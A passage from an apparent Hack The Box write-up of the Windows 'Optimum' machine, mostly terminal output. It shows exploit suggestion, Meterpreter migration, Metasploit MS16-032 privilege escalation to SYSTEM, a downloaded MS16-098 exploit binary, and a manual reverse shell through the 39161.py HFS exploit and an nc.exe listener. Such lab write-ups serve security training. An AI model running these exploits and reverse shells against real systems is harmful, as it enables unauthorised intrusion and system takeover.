</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:/opt/Windows-Exploit-Suggester$ python2 windows-exploit-suggester.py --database 2020-09-19-mssb.xls --systeminfo /tmp/systeminfo --quiet
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> initiating winsploit version 3.3...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> database file detected as xls or xlsx based on extension
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> attempting to <span style="color:#8be9fd;font-style:italic">read</span> from the systeminfo input file
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> systeminfo input file <span style="color:#8be9fd;font-style:italic">read</span> successfully <span style="color:#ff79c6">(</span>utf-8<span style="color:#ff79c6">)</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> querying database file <span style="color:#ff79c6">for</span> potential vulnerabilities
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> comparing the <span style="color:#bd93f9">32</span> hotfix<span style="color:#ff79c6">(</span>es<span style="color:#ff79c6">)</span> against the <span style="color:#bd93f9">266</span> potential bulletins<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> with a database of <span style="color:#bd93f9">137</span> known exploits
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> there are now <span style="color:#bd93f9">246</span> remaining vulns
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> exploitdb PoC, <span style="color:#ff79c6">[</span>M<span style="color:#ff79c6">]</span> Metasploit module, <span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> missing bulletin
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> windows version identified as <span style="color:#f1fa8c">&#39;Windows 2012 R2 64-bit&#39;</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS16-135: Security Update <span style="color:#ff79c6">for</span> Windows Kernel-Mode Drivers <span style="color:#ff79c6">(</span>3199135<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS16-098: Security Update <span style="color:#ff79c6">for</span> Windows Kernel-Mode Drivers <span style="color:#ff79c6">(</span>3178466<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>M<span style="color:#ff79c6">]</span> MS16-075: Security Update <span style="color:#ff79c6">for</span> Windows SMB Server <span style="color:#ff79c6">(</span>3164038<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS16-074: Security Update <span style="color:#ff79c6">for</span> Microsoft Graphics Component <span style="color:#ff79c6">(</span>3164036<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS16-063: Cumulative Security Update <span style="color:#ff79c6">for</span> Internet Explorer <span style="color:#ff79c6">(</span>3163649<span style="color:#ff79c6">)</span> - Critical
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS16-032: Security Update <span style="color:#ff79c6">for</span> Secondary Logon to Address Elevation of Privile <span style="color:#ff79c6">(</span>3143141<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>M<span style="color:#ff79c6">]</span> MS16-016: Security Update <span style="color:#ff79c6">for</span> WebDAV to Address Elevation of Privilege <span style="color:#ff79c6">(</span>3136041<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS16-014: Security Update <span style="color:#ff79c6">for</span> Microsoft Windows to Address Remote Code Execution <span style="color:#ff79c6">(</span>3134228<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS16-007: Security Update <span style="color:#ff79c6">for</span> Microsoft Windows to Address Remote Code Execution <span style="color:#ff79c6">(</span>3124901<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS15-132: Security Update <span style="color:#ff79c6">for</span> Microsoft Windows to Address Remote Code Execution <span style="color:#ff79c6">(</span>3116162<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS15-112: Cumulative Security Update <span style="color:#ff79c6">for</span> Internet Explorer <span style="color:#ff79c6">(</span>3104517<span style="color:#ff79c6">)</span> - Critical
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS15-111: Security Update <span style="color:#ff79c6">for</span> Windows Kernel to Address Elevation of Privilege <span style="color:#ff79c6">(</span>3096447<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege <span style="color:#ff79c6">(</span>3089657<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution <span style="color:#ff79c6">(</span>3089656<span style="color:#ff79c6">)</span> - Critical
<span style="color:#ff79c6">[</span>M<span style="color:#ff79c6">]</span> MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution <span style="color:#ff79c6">(</span>3079904<span style="color:#ff79c6">)</span> - Critical
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass <span style="color:#ff79c6">(</span>3050514<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>M<span style="color:#ff79c6">]</span> MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span style="color:#ff79c6">(</span>3057191<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution <span style="color:#ff79c6">(</span>3036220<span style="color:#ff79c6">)</span> - Critical
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege <span style="color:#ff79c6">(</span>3023266<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege <span style="color:#ff79c6">(</span>3011780<span style="color:#ff79c6">)</span> - Critical
<span style="color:#ff79c6">[</span>M<span style="color:#ff79c6">]</span> MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution <span style="color:#ff79c6">(</span>3011443<span style="color:#ff79c6">)</span> - Critical
<span style="color:#ff79c6">[</span>M<span style="color:#ff79c6">]</span> MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution <span style="color:#ff79c6">(</span>3000869<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>M<span style="color:#ff79c6">]</span> MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution <span style="color:#ff79c6">(</span>3000061<span style="color:#ff79c6">)</span> - Critical
<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span style="color:#ff79c6">(</span>2880430<span style="color:#ff79c6">)</span> - Important
<span style="color:#ff79c6">[</span>M<span style="color:#ff79c6">]</span> MS13-090: Cumulative Security Update of ActiveX Kill Bits <span style="color:#ff79c6">(</span>2900986<span style="color:#ff79c6">)</span> - Critical
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">done</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>metasploit run in 32 bits, but windows is 64 bits so we need to use the metasploit <code>migrate</code> command to attach to explorer.exe process</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; ps

Process <span style="color:#8be9fd;font-style:italic">List</span>
<span style="color:#ff79c6">============</span>

 PID   PPID  Name                     Arch  Session  User            Path
 ---   ----  ----                     ----  -------  ----            ----
 <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>     <span style="color:#ff79c6">[</span>System Process<span style="color:#ff79c6">]</span>
 <span style="color:#bd93f9">4</span>     <span style="color:#bd93f9">0</span>     System
 <span style="color:#bd93f9">228</span>   <span style="color:#bd93f9">4</span>     smss.exe
 <span style="color:#bd93f9">332</span>   <span style="color:#bd93f9">324</span>   csrss.exe
 <span style="color:#bd93f9">388</span>   <span style="color:#bd93f9">324</span>   wininit.exe
 <span style="color:#bd93f9">396</span>   <span style="color:#bd93f9">380</span>   csrss.exe
 <span style="color:#bd93f9">440</span>   <span style="color:#bd93f9">380</span>   winlogon.exe
 <span style="color:#bd93f9">480</span>   <span style="color:#bd93f9">388</span>   services.exe
 <span style="color:#bd93f9">1892</span>  <span style="color:#bd93f9">1000</span>  explorer.exe             x64   <span style="color:#bd93f9">1</span>        OPTIMUM<span style="color:#f1fa8c">\k</span>ostas  C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\e</span>xplorer.exe

meterpreter &gt; migrate <span style="color:#bd93f9">1892</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Migrating from <span style="color:#bd93f9">2828</span> to 1892...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Migration completed successfully.
</code></pre></td></tr></table>
</div>
</div><p>Privilege Escalation after upgrading session to 64 bits</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; <span style="color:#8be9fd;font-style:italic">bg</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Backgrounding session 1...
msf6 exploit<span style="color:#ff79c6">(</span>windows/http/rejetto_hfs_exec<span style="color:#ff79c6">)</span> &gt; search ms16_032

Matching <span style="color:#8be9fd;font-style:italic">Modules</span>
<span style="color:#ff79c6">================</span>

   <span style="color:#6272a4">#  Name                                                           Disclosure Date  Rank    Check  Description</span>
   -  ----                                                           ---------------  ----    -----  -----------
   <span style="color:#bd93f9">0</span>  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation


Interact with a module by name or index. For example info 0, use <span style="color:#bd93f9">0</span> or use exploit/windows/local/ms16_032_secondary_logon_handle_privesc

msf6 exploit<span style="color:#ff79c6">(</span>windows/http/rejetto_hfs_exec<span style="color:#ff79c6">)</span> &gt; use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit<span style="color:#ff79c6">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> session <span style="color:#bd93f9">1</span>
<span style="color:#8be9fd;font-style:italic">session</span> <span style="color:#ff79c6">=</span>&gt; <span style="color:#bd93f9">1</span>
msf6 exploit<span style="color:#ff79c6">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> LHOST 10.10.14.38
<span style="color:#8be9fd;font-style:italic">LHOST</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.38
msf6 exploit<span style="color:#ff79c6">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span style="color:#ff79c6">)</span> &gt; run
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> ...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">2</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:4444 -&gt; 172.17.0.1:42576<span style="color:#ff79c6">)</span> at 2020-09-18 17:29:11 +0000

meterpreter &gt; getuid
Server username: NT AUTHORITY<span style="color:#f1fa8c">\S</span>YSTEM
meterpreter &gt; cat /Users/Administrator/Desktop/root.txt
</code></pre></td></tr></table>
</div>
</div><h1 id="ms16_098">ms16_098</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> exec: wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe

Connecting to github.com <span style="color:#ff79c6">(</span>140.82.114.3:443<span style="color:#ff79c6">)</span>
Connecting to raw.githubusercontent.com <span style="color:#ff79c6">(</span>151.101.0.133:443<span style="color:#ff79c6">)</span>
41020.exe            100% |**********************************************************************************************************************************|  547k  0:00:00 ETA
msf6 exploit<span style="color:#ff79c6">(</span>windows/local/ms15_051_client_copy_image<span style="color:#ff79c6">)</span> &gt; sessions <span style="color:#bd93f9">1</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Starting interaction with 1...

meterpreter &gt; upload 41020.exe
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> uploading  : 41020.exe -&gt; 41020.exe
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Uploaded 547.00 KiB of 547.00 KiB <span style="color:#ff79c6">(</span>100.0%<span style="color:#ff79c6">)</span>: 41020.exe -&gt; 41020.exe
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> uploaded   : 41020.exe -&gt; 41020.exe
meterpreter &gt; shell
Process <span style="color:#bd93f9">2032</span> created.
Channel <span style="color:#bd93f9">13</span> created.
Microsoft Windows <span style="color:#ff79c6">[</span>Version 6.3.9600<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2013</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;41020.exe
41020.exe
Microsoft Windows <span style="color:#ff79c6">[</span>Version 6.3.9600<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2013</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;whoami
whoami
nt authority<span style="color:#f1fa8c">\s</span>ystem
</code></pre></td></tr></table>
</div>
</div><h1 id="without-metasploit">Without Metasploit</h1>
<p>Earlier, we found a python exploit 39161.py which requires nc.exe in a local http.server</p>
<p>Download netcat for windows and prepare an http server to upload it</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/optimus/http$ mkdir http <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">cd</span> http
ctf@014202efa8c8:~/htb/optimus/http$ wget https://github.com/fuzzdb-project/fuzzdb/blob/master/web-backdoors/exe/nc.exe
ctf@014202efa8c8:~/htb/optimus/http$ sudo python3 -m http.server <span style="color:#bd93f9">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:80/<span style="color:#ff79c6">)</span> ...
</code></pre></td></tr></table>
</div>
</div><p>We modify 39161.py to point to our IP and port 9000, and we listen to 9000 before we execute the exploit ``</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/optimus$ vi 39161.py
ctf@014202efa8c8:~/htb/optimus$ python2 39161.py 10.10.10.8 <span style="color:#bd93f9">80</span>
ctf@014202efa8c8:~/htb/optimus$
────────────────────────────────────────────────────────────────────────────────────────────────────────────
$ bash
ctf@014202efa8c8:~/htb/nibbles$ nc -lnvp <span style="color:#bd93f9">9000</span>
Listening on 0.0.0.0 <span style="color:#bd93f9">9000</span>
Connection received on 172.19.0.1 <span style="color:#bd93f9">53238</span>
Microsoft Windows <span style="color:#ff79c6">[</span>Version 6.3.9600<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2013</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;whoami
whoami
optimum<span style="color:#f1fa8c">\k</span>ostas

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\k</span>ostas<span style="color:#f1fa8c">\D</span>esktop&gt;
────────────────────────────────────────────────────────────────────────────────────────────────────────────
